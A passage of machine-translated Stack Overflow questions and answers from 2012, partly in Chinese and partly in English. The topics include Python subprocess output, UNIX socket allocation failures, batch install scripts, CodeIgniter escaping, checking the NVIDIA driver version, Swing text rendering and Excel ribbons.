            print 'Something bad happend'
            logging.error(e)

if __name__ == '__main__':
    forever() 
```

目前：

*   父打印子日志（因为默认情况下日志将消息发送到我们正在打印的标准错误和标准错误）
*   父母不打印孩子的印刷品，所以：

无限.py

```
#!/usr/bin/python

import logging
import sys
import time

logging.basicConfig(level=logging.INFO)

sys.stdout = sys.stderr

i = 0
while 1:
    i += 1
    logging.info('i: {0}'.format(i))
    print i
    time.sleep(0.2) 
```

2.  另一种方法在这里：

[在运行时拦截子进程的标准输出](https://stackoverflow.com/questions/527197/intercepting-stdout-of-a-subprocess-while-it-is-running)

我的代码适应了解决方案

主文件

```
#!/usr/bin/python

import logging
import subprocess
import sys

def forever():
    CMD = [sys.executable, 'infinit.py']
    while 1:
        try:
            print 'running new instance of:'
            print ' '.join(CMD)

            popen = subprocess.Popen(CMD, stdout=subprocess.PIPE)
            for line in iter(popen.stdout.readline, ""):
                print line,

        except Exception as e:
            print 'Something bad happend'
            logging.error(e)
        finally:
            print

if __name__ == '__main__':
    forever() 
```

初始化文件

```
#!/usr/bin/python

import logging
import sys
import time

class FlushFile(object):
    """Write-only flushing wrapper for file-type objects."""
    def __init__(self, f):
        self.f = f
    def write(self, x):
        self.f.write(x)
        self.f.flush()

logging.basicConfig(level=logging.INFO)

sys.stdout = FlushFile(sys.stdout)

i = 0
while 1:
    i += 1
    logging.info('i: {0}'.format(i))
    print i
    time.sleep(0.2) 
```

# c - sendto 失败 UNIX 域套接字

> ID：13125702
> 
> 赞同：1
> 
> 时间：2012-10-29T16:26:39.047
> 
> 标签：c, linux, embedded-linux

sendto 系统调用失败，错误为“没有可用的缓冲区空间”，错误代码为“ENOMEM”。似乎是 sendto 中的 kmalloc 失败。当我读到它时，我了解到它可能由于连续内存不可用而失败。但是，系统有足够的空闲内存。我不确定为什么 kmalloc 会失败。

PS：我在嵌入式硬件中运行应用程序。

sendto 失败时的错误消息：

```
MYAPP: page allocation failure. order:5, mode:0x4d0
[<c002b2a8>] (unwind_backtrace+0x0/0xcc) from [<c0063de0>] (__alloc_pages_internal+0x39c/0x3bc)

[<c0063de0>] (__alloc_pages_internal+0x39c/0x3bc) from [<c0294f40>] (cache_alloc_refill+0x264/0x514)

[<c0294f40>] (cache_alloc_refill+0x264/0x514) from [<c007a7e0>] (__kmalloc+0x84/0xd8)

[<c007a7e0>] (__kmalloc+0x84/0xd8) from [<c0213f88>] (__alloc_skb+0x44/0xf4)

[<c0213f88>] (__alloc_skb+0x44/0xf4) from [<c020fa2c>] (sock_alloc_send_pskb+0x94/0x2f8)

[<c020fa2c>] (sock_alloc_send_pskb+0x94/0x2f8) from [<c020fca8>] (sock_alloc_send_skb+0x18/0x1c)

[<c020fca8>] (sock_alloc_send_skb+0x18/0x1c) from [<c0273830>] (unix_dgram_sendmsg+0x168/0x44c)

[<c0273830>] (unix_dgram_sendmsg+0x168/0x44c) from [<c020d47c>] (sock_sendmsg+0xac/0xcc)

[<c020d47c>] (sock_sendmsg+0xac/0xcc) from [<c020e3fc>] (sys_sendto+0xb0/0xd4)

[<c020e3fc>] (sys_sendto+0xb0/0xd4) from [<c0025c00>] (ret_fast_syscall+0x0/0x2c)

Mem-info:

Normal per-cpu:

CPU    0: hi:   18, btch:   3 usd:   0

Active_anon:3321 active_file:194 inactive_anon:3324

inactive_file:2449 unevictable:173 dirty:0 writeback:0 unstable:0

free:4348 slab:929 mapped:1186 pagetables:115 bounce:0

Normal free:17392kB min:1016kB low:1268kB high:1524kB active_anon:13284kB inactive_anon:13296kB active_file:776kB inactive_file:9796kB unevictable:692kB present:65024kB pages_scanned:0 all_unreclaimable? no

lowmem_reserve[]: 0 0

Normal: 418*4kB 1251*8kB 347*16kB 3*32kB 1*64kB 0*128kB 0*256kB 0*512kB 0*1024kB 0*2048kB 0*4096kB = 17392kB

2876 total pagecache pages

16384 pages of RAM

4485 free pages

1097 reserved pages

929 slab pages

1401 pages shared

0 pages swap cached 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T17:45:32.767

这里适当的处理可能是软件设计。您尝试通过本地数据报套接字发送 88kb 数据包是否有原因？对于这种大小的数据，流套接字似乎是一个更合适的选择（我猜它很可能在另一端按顺序解析）。对于非常小的传输，流开销是可以测量的，但在进程之间复制这么多数据时肯定不是。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:32:59.270

关键词是“连续”——你可以有很多空闲页面，但没有一个是相邻的。

我想解决方案可能是一次发送少于 1 页的价值？

# magento - 编辑购物车 Magento 不显示

> ID：13125704
> 
> 赞同：0
> 
> 时间：2012-10-29T16:26:48.263
> 
> 标签：magento, magento-1.7

我开发了一个网页，您可以在其中浏览产品、购买产品、结帐……但是当您按下产品的“编辑”时，它会显示一个空白的主页。出现其他所有内容，但不显示产品的编辑。那部分仍然是白色的……知道为什么吗？

你可以在这里试试[！](http://www.bassarchery.com/bass.html).

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T18:51:17.663

将此添加到您的 local.xml：

```
<checkout_cart_configure translate="label">
    <label>Configure Cart Item</label>
    <update handle="catalog_product_view"/>
    <reference name="product.info">
        <block type="checkout/cart_item_configure" name="checkout.cart.item.configure.block"></block>
    </reference>
</checkout_cart_configure> 
```

# if-statement - 软件安装脚本

> ID：13125706
> 
> 赞同：0
> 
> 时间：2012-10-29T16:27:00.463
> 
> 标签：if-statement, for-loop, batch-file, goto

我遇到了以下脚本的问题，我们希望将其用作登录脚本的一部分，以检查是否已安装软件，如果未安装，请安装它：

```
:STEP1
for /f "delims= " %%a in (C:\software-dist.txt) do (
if "%%a"=="Softwarename1" goto STEP2
)
\\server\share\software1.exe
echo Softwarename1 >> C:\software-dist.txt

:STEP2
for /f "delims= " %%a in (C:\software-dist.txt) do (
if "%%a"=="Software name 2" goto END
)
\\server\share\software2.exe /Q
echo Software name 2 >> C:\software-dist.txt

:END 
```

代码是 STEP1 工作得很好——这里的软件名称是一个单词“ **Softwarename1** ”。但是，STEP2 中的代码不起作用 - 这里的软件名称写成 3 个单独的单词“**软件名称 2** ”（每个单词之间有一个空格）。每次运行脚本时，*c:\software-dist.txt*都会更新为另一行“**软件名称 2** ”。

任何想法我做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T18:55:01.553

lc 在他的评论中指出了这个问题，但没有明确提供明显的解决方案。

您正在将标记分隔符设置为空格。您需要使用 禁用 DELIMS 选项 `"DELIMS="`。

```
for /f "delims=" %%a in (C:\software-dist.txt) do ... 
```

此外，您的 ECHO 语句末尾有一个额外的空格，导致您稍后在另一次运行中对其进行测试时该行不匹配。如果删除空格，则 2 将被视为 stderr 的句柄。一种解决方法是添加括号。

```
(echo Software name 2) >> C:\software-dist.txt 
```

但是有一个更简单、更快的解决方案。您可以使用 FINDSTR 确定文件中是否存在特定行。

```
:Step1
>nul findstr /xc:"Softwarename1" "C:\software-dist.txt" || (
  "\\server\share\%%F"
  >>"C:\software-dist.txt%" echo Softwarename1
)

:Step2
>nul findstr /xc:"Software name 2" "C:\software-dist.txt" || (
  "\\server\share\%%F"
  >>"C:\software-dist.txt%" echo Software name 2
) 
```

通过添加变量和 FOR 循环，代码更短且更易于维护。

```
set "file=C:\software-dist.txt"
for %%F in ("Softwarename1" "Software name 2") do (
  >nul findstr /xc:%%F "%file%" || (
    "\\server\share\%%~F"
    (echo %%~F)>>"%file%"
  )
) 
```

# codeigniter - codeigniter 活动记录，何时转义，如果有的话

> ID：13125707
> 
> 赞同：1
> 
> 时间：2012-10-29T16:27:01.973
> 
> 标签：codeigniter, activerecord, escapestring

我最近才开始使用活动记录（在我刚刚编写手动查询之前，因为我已经习惯了它们）。

我正在查看 ion_auth 的代码，我看到在一些地方，即使使用了活动记录，字符串也被转义了，

IE

```
 ->where($this->identity_column, $this->db->escape_str($identity))
 ->where($this->tables['groups'].'.name', $this->db->escape_str($group)) 
```

问题是，我没有在使用过活动记录的任何地方逃脱，因为在文档中它说活动记录会自动转义字符串。

我的问题是，在使用活动记录时，在某些情况下应该转义字符串吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-29T19:37:24.673

来自 Codeigniter 用户指南：

> 除了简单之外，**使用 Active Record**功能的一个主要好处是它允许您创建独立于数据库的应用程序，因为查询语法是由每个数据库适配器生成的。**它还允许更安全的查询，因为系统会自动转义这些值。**

ion_auth 的创建者可能有特殊原因转义字符串，但如果您使用 Active Record，Codeigniter 会自动转义查询。

但是有些查询“看起来”像是 Active Record，需要转义。[这是它们的列表](http://codeigniter.com/user_guide/database/queries.html)，同样来自 Codeigniter 用户指南。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:35:46.833

通常你可以让 codeigniter 处理它。在某些情况下，如果您正在使用活动记录构建更复杂的查询（例如：`$this->db->where('(some sql where clause)')`您可以使用 DB 库的转义方法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-30T05:10:48.030

不，没有必要使用转义。我尝试过使用不同格式的文本混合单引号和双引号以及一大堆html标签，一切都很好。

# php - 你可以在 Omega/Drupal 7 中拥有多个 node.tpl.php 吗？

> ID：13125712
> 
> 赞同：1
> 
> 时间：2012-10-29T16:27:24.217
> 
> 标签：php, drupal, drupal-7, drupal-themes

在 Omega/Drupal 7 中是否可以有多个 node.tpl.php？

例如，如果我希望主页拉入 node.tpl.php（事件/文章），但是一旦单击“阅读更多”链接，它就会转到类似于 event.tpl.php 或 article.tpl.php 的格式内容以不同的方式？

谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-29T17:18:10.187

假设链接到不同的页面（或不同的节点），那么是的。

您可以使用 phptemplate 系统在字段级别定义所有您想要的模板。例如，您可以有一个`page--front.tpl.php`, `page--node-1.tpl.php`, 和`page--node-2.tpl.php`to 主题特定页面，或 a `node--type.tpl.php`to 特定类型的主题节点。

Drupal.org 有一个核心[主题钩子（模板）建议](http://drupal.org/node/1089656)列表。

您还可以使用[Theme Developer](http://drupal.org/project/devel_themer)模块打印出您网站的给定部分正在使用的模板，以及您可以使用的替代模板的名称。查看[使用模板建议](http://drupal.org/node/223440#custom-suggestions)指南了解更多详细信息。

# linux - 如何从命令行获取 nvidia 驱动程序版本？

> ID：13125714
> 
> 赞同：103
> 
> 时间：2012-10-29T16:27:38.503
> 
> 标签：linux, cuda, driver

为了调试 CUDA 代码和检查兼容性，我需要找出我安装的 GPU 的 nvidia 驱动程序版本。我发现[如何获得 cuda 版本？](https://stackoverflow.com/questions/9727688/how-to-get-the-cuda-version)但这对我没有帮助。

* * *

## 回答 #1

> 赞同：147
> 
> 时间：2012-10-29T16:32:16.380

使用`nvidia-smi`应该告诉你：

```
bwood@mybox:~$ nvidia-smi 
Mon Oct 29 12:30:02 2012       
+------------------------------------------------------+                       
| NVIDIA-SMI 3.295.41   Driver Version: 295.41         |                       
|-------------------------------+----------------------+----------------------+
| Nb.  Name                     | Bus Id        Disp.  | Volatile ECC SB / DB |
| Fan   Temp   Power Usage /Cap | Memory Usage         | GPU Util. Compute M. |
|===============================+======================+======================|
| 0\.  GeForce GTX 580           | 0000:25:00.0  N/A    |       N/A        N/A |
|  54%   70 C  N/A   N/A /  N/A |  25%  383MB / 1535MB |  N/A      Default    |
|-------------------------------+----------------------+----------------------|
| Compute processes:                                               GPU Memory |
|  GPU  PID     Process name                                       Usage      |
|=============================================================================|
|  0\.           Not Supported                                                 |
+-----------------------------------------------------------------------------+ 
```

* * *

## 回答 #2

> 赞同：108
> 
> 时间：2012-10-29T18:41:33.457

在*任何*安装了 NVIDIA 驱动程序并加载到内核中的 linux 系统上，您可以执行：

```
cat /proc/driver/nvidia/version 
```

获取当前加载的 NVIDIA 内核模块的版本，例如：

```
$ cat /proc/driver/nvidia/version 
NVRM version: NVIDIA UNIX x86_64 Kernel Module  304.54  Sat Sep 29 00:05:49 PDT 2012
GCC version:  gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu5) 
```

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2015-03-29T11:35:06.227

`modinfo`成功了。

```
root@nyx:/usr/src# modinfo nvidia|grep version:
version:        331.113 
```

* * *

## 回答 #4

> 赞同：12
> 
> 时间：2017-06-17T05:43:40.743

视窗版本：

> cd \Program Files\NVIDIA Corporation\NVSMI
> 
> 英伟达-smi

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2012-10-29T16:27:38.503

**[注意：我不是故意删除我的答案，所以人们知道如何不这样做]**

如果您使用：

```
me@over_there:~$  dpkg --status nvidia-current | grep Version | cut -f 1 -d '-' | sed 's/[^.,0-9]//g'
260.19.06 
```

您将通过您的发行版的打包机制获得安装的 nVIDIA 驱动程序包的版本。但这**可能不是**现在作为内核的一部分实际运行的版本。

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2018-09-18T18:01:10.353

为了扩展 ccc 的答案，如果您想将查询卡与脚本结合起来，以下是 Nvidia 网站上有关如何执行此操作的信息：

[https://nvidia.custhelp.com/app/answers/detail/a_id/3751/~/useful-nvidia-smi-queries](https://nvidia.custhelp.com/app/answers/detail/a_id/3751/~/useful-nvidia-smi-queries)

另外，我发现这个线程正在研究 powershell。下面是一个示例命令，它运行实用程序以获取 GPU 上可用的真实内存以帮助您入门。

```
# get gpu metrics
$cmd = "& 'C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi' --query-gpu=name,utilization.memory,driver_version --format=csv"
$gpuinfo = invoke-expression $cmd | ConvertFrom-CSV
$gpuname = $gpuinfo.name
$gpuutil = $gpuinfo.'utilization.memory [%]'.Split(' ')[0]
$gpuDriver = $gpuinfo.driver_version 
```

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2021-12-23T00:23:23.297

```
nvidia-smi --query-gpu=driver_version --format=csv,noheader --id=0 
```

将结果作为不需要进一步解析的字符串返回，例如：470.82.00

如果由于某种原因 nvidia-smi 不可用，可以通过调用驱动程序 API 来获取信息。可以使用 Python ctypes 库加载驱动程序库。

对于 CUDA，请参阅： [https ://gist.github.com/f0k/63a664160d016a491b2cbea15913d549](https://gist.github.com/f0k/63a664160d016a491b2cbea15913d549)

有关驱动程序信息，请参阅： [https ://github.com/mars-project/mars/blob/a50689cda4376d82a40b7aa9833f572299db7efd/mars/lib/nvutils.py](https://github.com/mars-project/mars/blob/a50689cda4376d82a40b7aa9833f572299db7efd/mars/lib/nvutils.py)

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2017-12-12T20:46:31.030

如果您需要在 Linux 系统上的 Python 程序中获取该程序以实现可重复性：

```
with open('/proc/driver/nvidia/version') as f:
    version = f.read().strip()
print(version) 
```

给出：

```
NVRM version: NVIDIA UNIX x86_64 Kernel Module  384.90  Tue Sep 19 19:17:35 PDT 2017
GCC version:  gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.5) 
```

# java - 使用 flex netConnection.call 方法检索列表

> ID：13125716
> 
> 赞同：1
> 
> 时间：2012-10-29T16:27:46.697
> 
> 标签：java, actionscript-3, red5

我正在使用 red5 和使用 AS3 的自定义 flex 客户端进行一些测试，类似于他们在带有 AS2 的 Flash 上使用的简单广播器。但是我在服务器上加了一个功能

```
public List<String> listaCanales(){
        List<String> canales = new ArrayList<String>();
        canales.add("Canal 1");
        canales.add("Canal 2");
        canales.add("Canal 3");
        canales.add("Canal 4");
        canales.add("Canal x");
        return canales;
    } 
```

这个函数只是一个测试，想法是检索我在 red5 上创建的所有通道，最终将通道作为范围。

我之前创建了一个名为 add 的小函数，它可以工作

```
public int add(int a, int b){
        return a+b;
    } 
```

这是我如何调用 add 函数

```
connection  = new NetConnection();
connection.connect("rtmp://"+servidor+"/"+red5App);
connection.addEventListener(NetStatusEvent.NET_STATUS, onConnected);
connection.addEventListener(SecurityErrorEvent.SECURITY_ERROR, securityErrorHandler);
var nr:Responder = new Responder(netResponderHandler);
connection.call("add", nr,5,6); 
```

它适用于 add 函数，但是当我尝试 listaCanales 函数时，它就像 netResponder 处理程序不起作用。

```
connection  = new NetConnection();
connection.connect("rtmp://"+servidor+"/"+red5App);
connection.addEventListener(NetStatusEvent.NET_STATUS, onConnected);
connection.addEventListener(SecurityErrorEvent.SECURITY_ERROR, securityErrorHandler);
var nr:Responder = new Responder(netResponderHandler);
connection.call("listaCanales", nr,null); 
```

或者

```
connection.call("listaCanales", nr); 
```

这是我的 netResponderHandler

```
protected function netResponderHandler(serverResult:Object):void
{   
    registros("Something happened");
    //registros("The result is " + serverResult);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-30T10:03:25.157

当您说*我创建了一个小函数 xzy 时*，我假设您的测试函数是一个充当“web.handler”的类。所以这个函数在一个扩展 Red5 的 ApplicationAdapter 的 Class 中。

如果 Red5 服务器无法处理调用（因为它无法将请求映射到 ApplicationAdapter 中的特定方法），那么您将在 red5 或错误日志文件中看到一些日志条目。

你检查过那些日志吗？

当您将 conf/logback.xml 中的调试级别从 INFO 提高到更高级别时，您能看到请求吗？

另外我想知道您的 AS 脚本，实际上您应该等待方法调用，直到您收到连接成功方法。不只是在一行中调用所有方法。您必须编写此事件驱动的代码。因此，在“onconnect”处理程序中，您检查 => 连接成功。然后你继续你的程序来调用/测试你的方法。

塞巴斯蒂安

# visual-studio-2010 - C++ 程序未在 Visual Studio 2010 中读取绝对路径

> ID：13125721
> 
> 赞同：1
> 
> 时间：2012-10-29T16:27:53.533
> 
> 标签：visual-studio-2010, visual-c++, vmware, bootcamp, libsndfile

我有一个 C++ 程序没有读取 Visual Studio 中的绝对路径。

以下代码适用于我的桌面环境（Windows 7、Visual Studio 2010、64 位）。但是，在我的 macbook 上，我正在为具有完全相同 Visual Studio 2010 的 Windows 7 64 位虚拟机运行 bootcamp 和/或 VMware。

我试图解决这个问题：

1.  我确保我的 macbook 上的绝对路径与桌面上的绝对路径相同。我进一步确保我安装了第三方库来以与桌面两次相同的方式读取我的波形文件。

2.  我重写了在桌面上运行的程序，在我的 macbook 上重新安装了库。更简单的程序可以在桌面上运行，但是唉，仍然无法在 macbook 上读取绝对路径。

3.  我移动了 wav 文件，因此不是路径，而是实际项目解决方案本身。不用找了。

4.  谷歌。

为了您的利益，我将代码包含在底部。我使用 libsndfile 库来读取 wav 文件。我可能只是尝试使用我非常旧的蹩脚 Windows 笔记本电脑，但无法理解我的 macbook VM 机器上可能出了什么问题。

```
// WaveReader.cpp : main project file.

#include "stdafx.h"
#include <stdlib.h>
#include <stdio.h>
#include <sndfile.h>

using namespace System;

int main(array<System::String ^> ^args)
{
    Console::WriteLine(L"Hello World");
    SNDFILE *sf; 
    SF_INFO info; 

    /*Open the wav file. */
    info.format = 0;
    sf = sf_open("C:\\Users\\geekyomega\\gameover.wav",SFM_READ,&info);
    if (sf == NULL)
    {
        printf("Failed to open the file.\n");
        getchar();
        exit(-1);
    } 
```

}

我的输出，当我运行这个程序时

```
Failed to open the file 
```

一如既往，感谢您阅读此问题。我非常感谢你们中的任何人所获得的任何帮助、帮助或智慧。特别是如果您遇到类似的问题。

热烈的问候， GeekyOmega

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-02T04:42:57.053

原来是和权限有关。此外，Hans Passant 是正确的，绝对路径不是好的编码习惯。这是作为概念证明的，所以请让我在技术性上有所保留。

问候， GeekyOmega

# asp.net - 是否可以根据组织获取用户暂停状态？

> ID：13125724
> 
> 赞同：0
> 
> 时间：2012-10-29T16:28:06.683
> 
> 标签：asp.net, .net, google-provisioning-api

我需要查看组织内所有用户的暂停状态。不幸的是，OrganizationService.RetrieveAllOrganizationUsers() 没有向我们提供暂停信息。

我可以根据上述方法的结果得到一组AppsExtendedEntry，并通过调用AppService.RetrieveUser()对其进行迭代，但这非常慢而且效率极低。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T12:26:34.740

获取该数据的最佳方法可能是：

1) 通过 Org API 调用获取实例中的所有用户： [https ://developers.google.com/google-apps/provisioning/#retrieving_organization_users_experimental](https://developers.google.com/google-apps/provisioning/#retrieving_organization_users_experimental)

2）通过多域API调用获取所有用户实例： [https ://developers.google.com/google-apps/provisioning/#retrieving_users_experimental](https://developers.google.com/google-apps/provisioning/#retrieving_users_experimental)

3) 将用户列表从第 1 步过滤到您要使用的特定组织。

4) 通过交叉引用步骤 2 中的用户列表中的用户，将步骤 3 中的用户列表过滤到暂停的用户。

周杰伦

# android - 使用片段修复应用程序图标导航

> ID：13125728
> 
> 赞同：0
> 
> 时间：2012-10-29T16:28:38.253
> 
> 标签：android, android-actionbar, fragment

我有一个 android 应用程序，我正在转向基于片段的设计。

主要活动是列表片段，在选择项目时显示几个细节片段之一。其中一个细节片段是一个列表，它在安卓手机上打开一个新的细节活动。我想将应用程序图标用作后退按钮，但是，它会一直回到我的根活动并显示第一个列表，而不是第二个。

听筒返回按钮做了正确的事情，只是返回一级。如何修复 onOptionsItemSelected 方法以返回到最后一个片段，而不是根片段？

谢谢，格里

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:40:18.983

使用 return 后跟 finish()

```
finish();
return; 
```

这将完成当前活动并返回上一个活动。

# java - Java Swing 的 drawString 显示回声

> ID：13125732
> 
> 赞同：2
> 
> 时间：2012-10-29T16:28:58.057
> 
> 标签：java, swing, graphics2d, drawstring

我不确定我做错了什么......

我想制作一个 JComponent 来显示一个带有自定义字体、自定义颜色（包括渐变背景）等的字符串。它工作正常，但我在组件的左上角看到了字符串的底部。下面的代码简化了很多组件，以便专注于问题......

**信息面板.java**

```
import java.awt.*;
import java.awt.font.*;
import java.awt.geom.Rectangle2D;

import javax.swing.*;

/**
 * Panel showing information.
 */
@SuppressWarnings("serial")
class InfoPanel extends JComponent
{
  private String m_information;
  private Font m_font;
  private Color m_colorForeground;
  private Color m_colorBackground;

  protected float heightFactor;
  protected int m_alignment = SwingConstants.CENTER;

  InfoPanel(String info, Font font, Color colorFore, Color colorBackground)
  {
    m_information = info;
    m_font = font;
    m_colorForeground = colorFore;

    if (colorFore == null)
    {
      m_colorForeground = Color.BLACK;
    }
    if (colorBackground == null)
    {
      m_colorBackground = Color.GRAY;
    }
    else
    {
      m_colorBackground = colorBackground;
    }
    setOpaque(true);
  }

  @Override
  protected void paintComponent(Graphics g)
  {
    final Graphics2D g2d = (Graphics2D) g.create();
    g2d.setFont(m_font);

    g2d.setColor(m_colorBackground);
    Dimension d = getSize();
    g2d.fillRect(0, 0, d.width, d.height);
    g2d.setColor(m_colorForeground);

    // Get the text bounds
    FontRenderContext fontContext = g2d.getFontRenderContext();
    TextLayout layout = new TextLayout(m_information, m_font, fontContext);
    layout.draw(g2d, 0, 0);
    Rectangle2D bounds = layout.getBounds();

    int posX = 10;
    int width = (int) bounds.getWidth();
    int height = (int) bounds.getHeight();
    if (m_alignment == SwingConstants.CENTER)
    {
      posX = (d.width - width) / 2;
    }
    else if (m_alignment == SwingConstants.RIGHT)
    {
      posX = d.width - width - posX;
    }
    // Center vertically
    FontMetrics fm = g2d.getFontMetrics();
    int posY = d.height / 2 + height / 2 - fm.getDescent();

    g2d.drawString(m_information, posX, posY);
    // Only drawString shows this problem!
    g2d.drawLine( posX, posY + 5, posX + width, posY + 5 );

    g2d.dispose();
  }
} 
```

**TestInfoPanel.java**

```
import java.awt.*;

import javax.swing.*;

public class TestInfoPanel
{
  private JPanel m_panel;

  TestInfoPanel()
  {
  }

  private JScrollPane getContent()
  {
    m_panel = new JPanel(new GridLayout(0, 1));
    m_panel.add(new InfoPanel("A Title jqpgy_@,;!§",
        new Font("Arial", Font.PLAIN, 24),
        Color.RED, Color.LIGHT_GRAY));
    m_panel.add(new InfoPanel("A Sub-Title jqpgy_@,;!§",
        new Font("Tahoma", Font.PLAIN, 18),
        Color.BLUE, Color.YELLOW));
    m_panel.add(new JPanel());
    return new JScrollPane(m_panel);
  }

  public static void main(String[] args)
  {
    final TestInfoPanel tm = new TestInfoPanel();
    SwingUtilities.invokeLater(new Runnable()
    {
      @Override
      public void run()
      {
        JFrame f = new JFrame();
        f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        f.setTitle(tm.getClass().getName());
        f.setContentPane(tm.getContent());
        f.setSize(800, 400);
        f.setLocation(200, 200);
        f.setVisible(true);
      }
    });
  }
} 
```

这是我看到的： ![图形错误：文本回声](../Images/250f7cfe739ddfd3bbf18e5c903dbf52.png) 在 Windows 7 上测试，在 Java 5、6、7 中看到。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-29T16:44:15.930

似乎`layout.draw`在左上角绘制文本，然后使用`g2d.drawString`. 您可以删除`g2d.drawString`并直接将正确的位置传递给`layout.draw`。

```
layout.draw(g2d, posX, posY); 
```

（或仅删除`layout`和使用`g2d.drawString`; 似乎也可以。）

# visual-studio-lightswitch - LightSwitch Add link inside a grid

> ID：13125736
> 
> 赞同：1
> 
> 时间：2012-10-29T16:29:24.233
> 
> 标签：visual-studio-lightswitch

I have created a new "list and details" screen. In the same window I show all "Order" entities and other depended entities called "OrderInfo" (one to many relation) The "OrderInfo" is displayed in a grid. I want to make one of the column inside the grid to be a link, so when user clicked on it, it will open another screen that shows the OrderInfo details.

thanks

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-30T09:44:13.877

You can do this for any string property of the entity that you're displaying in the grid. Simply tick the "Show As Link" box in the properties window).

![enter image description here](../Images/5cb1a51ccafed039cb567dbff2b39519.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-07T17:26:24.480

You can make any field into a link in a Data Grid by checking the "Show as Link" property. But first you must make sure that the field is a 'Label' type, or else that option is not available.

# asp.net - 带有来自数据库的图像的图像滑块

> ID：13125740
> 
> 赞同：0
> 
> 时间：2012-10-29T16:29:37.623
> 
> 标签：asp.net, image, slider

我正在为 ASP.Net 搜索 3 到 5 个图像的简单图像滑块。我知道这有数百个，但我搜索了一些可以在加载页面时轻松从数据库加载文件名的内容。

它应该在 www.urepair.de 上看起来像这样

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:58:35.127

看看[Easy 滑块](http://cssglobe.com/easy-slider-17-numeric-navigation-jquery-slider/)。使用转发器绑定数据：

```
<asp:Repeater ID="rptrSlider" OnItemDataBound="rptrSlider_ItemDataBound" runat="server">
    <HeaderTemplate>
        <ul>
    </HeaderTemplate>
    <ItemTemplate>
        <li>
            <a href="<%# Eval("YourNavigateUrl") %>">
                <asp:Image ID="imgSliderItem" runat="server" />
            </a>
        </li>
    </ItemTemplate>
    <FooterTemplate>
        </ul>
    </FooterTemplate>
</asp:Repeater> 
```

在您的 C# 代码中使用 ItemDataBound 事件：

```
protected void rptrSlider_ItemDataBound(object sender, RepeaterItemEventArgs e)
{
        if (e.Item.ItemType == ListItemType.AlternatingItem || e.Item.ItemType == ListItemType.Item)
        {
            YourSliderItem sliderItem = (YourSliderItem)e.Item.DataItem;
            Image imgSliderItem = e.Item.FindControl("imgSliderItem") as Image;
            imgSliderItem.AlternateText = sliderItem.AltText;
            imgSliderItem.ImageUrl = sliderItem.ImgUrl;
        }
    } 
```

# php - 退出确认消息 javascript

> ID：13125742
> 
> 赞同：0
> 
> 时间：2012-10-29T16:29:55.123
> 
> 标签：php, return, message, exit, confirm

> **可能重复：**
> [如何显示“您确定要离开此页面吗？” 何时提交更改？](https://stackoverflow.com/questions/1119289/how-to-show-the-are-you-sure-you-want-to-navigate-away-from-this-page-when-ch)

我使用 javascript 消息来确认将退出页面的人，只要 for 没有保存，所以我有以下代码：

```
 <body onLoad="getdate2()" <?php if(!isset($_POST['enreg'])){ echo 
'onBeforeUnload="return(\'Vous n avez pas enregistr&eacute; les modifications 
apport&eacute;es. voulez vous vraiment quitter la page ?\')' ; } ?>"> 
```

主要的麻烦是当用户单击表单提交按钮时，会出现此消息。

有没有办法在用户单击十字架退出时显示它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:35:15.043

看起来您希望 PHP 会影响页面在浏览器中的工作方式。它不是那样工作的。

您需要删除 PHP 并离开该`onBeforeUnload`事件。然后，在`onClick`提交按钮的情况下，删除该`onBeforeUnload`事件。

# excel - 在 Excel 2010 中添加基本功能区的 VBA 代码？

> ID：13125751
> 
> 赞同：4
> 
> 时间：2012-10-29T16:30:16.997
> 
> 标签：excel, vba, excel-2007, ribbon, excel-2010

我已经使用产品在 C# (addin express) 中为 Excel 编写功能区，但我需要知道如何使用 vba 生成功能区。有人可以为我提供一些代码，为此在工具栏中插入一个额外的功能区吗？

我所说的功能区是指上面写着“公式”、“数据”、“评论”等的地方

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-31T09:14:10.177

您可以结合使用 XML 和 VBA 在 Excel 中自定义功能区。

自定义功能区的一个很好的起点：http: [//msdn.microsoft.com/en-us/library/office/aa338202%28v=office.12%29.aspx](http://msdn.microsoft.com/en-us/library/office/aa338202%28v=office.12%29.aspx)（标题说 Office 2007，但它适用于Office 2010 也是如此）

另一个很好的来源是[他评论中提到的](http://www.rondebruin.nl/win/s2/win001.htm)那个胡说八道。

还有一个免费应用程序可以帮助您设计和验证 XML 以修改功能区，称为“Microsoft Office 自定义 UI 编辑器”： http: [//openxmldeveloper.org/blog/b/openxmldeveloper/archive/2006/05/25 /customuieditor.aspx](http://openxmldeveloper.org/blog/b/openxmldeveloper/archive/2006/05/25/customuieditor.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-20T06:09:18.623

有一个简单的技巧 - xml 将包含在您的 .xlsm 文件中。

请参阅此链接 [如何使用 VBA 添加自定义功能区选项卡？](https://stackoverflow.com/questions/8850836/how-to-add-a-custom-ribbon-tab-using-vba/22524350#22524350)

# c# - C#：重载具有不同类型参数的 LINQ 泛型方法

> ID：13125752
> 
